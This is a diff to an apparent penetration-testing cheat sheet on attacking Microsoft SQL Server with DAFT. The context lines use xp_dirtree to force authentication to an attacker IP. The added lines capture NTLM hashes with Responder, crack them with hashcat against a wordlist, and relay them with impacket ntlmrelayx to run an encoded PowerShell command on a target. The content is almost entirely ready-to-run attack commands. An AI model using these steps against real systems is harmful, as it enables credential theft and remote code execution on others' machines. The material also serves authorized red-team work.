@@ -103,6 +103,28 @@ daft.exe -i <SQL SERVER> -d master -m query -q "EXECUTE AS LOGIN = 'sa'; EXEC sp
 daft.exe -i <SQL SERVER> -d master -m query -q "EXEC master..xp_dirtree \"\\192.168.X.Y\test\";"
 ```
 
+#### Capture NTLM Relay hash
+
+Set up responder ad get NTML relay hash
+
+```
+responder -I tun0
+```
+
+crack it with hashcat
+
+```
+ hashcat -m 5600 sqlsvc_hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+#### Relay hash for code execution
+
+impacket ntlmrelay
+
+```
+python3 ntlmrelayx.py --no-http-server -smb2support -t 172.16.98.152 -c 'powershell -enc <ENDOCDED COMMAND>'
+```
+
 ### DAFT Built in CMD Execution
 
 ```
